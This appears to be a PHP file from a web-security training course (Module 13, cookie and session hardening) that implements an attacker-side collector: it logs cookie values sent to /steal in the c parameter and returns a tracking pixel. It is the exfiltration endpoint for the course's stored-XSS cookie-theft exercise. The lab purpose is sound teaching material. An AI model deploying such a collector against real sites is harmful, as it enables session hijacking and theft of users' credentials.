<?php

/**
 * router.php (the "attacker's collector")
 *
 * Module 13: Cookie & Session Hardening.
 *
 * PHP equivalent of node/attacker-collector/server.js -- logs whatever
 * arrives in ?c= and responds with a 1x1 transparent GIF.
 *
 * Introduced in: Module 13.
 * Prerequisite concepts: Module 07 (Stored XSS via POST).
 */

declare(strict_types=1);

$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

if ($path === '/steal') {
    $cookieValue = $_GET['c'] ?? '(nothing captured)';
    error_log('[COLLECTOR] received cookie value: ' . json_encode($cookieValue));
}

$pixel = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBTAA7');
header('Content-Type: image/gif');
echo $pixel;
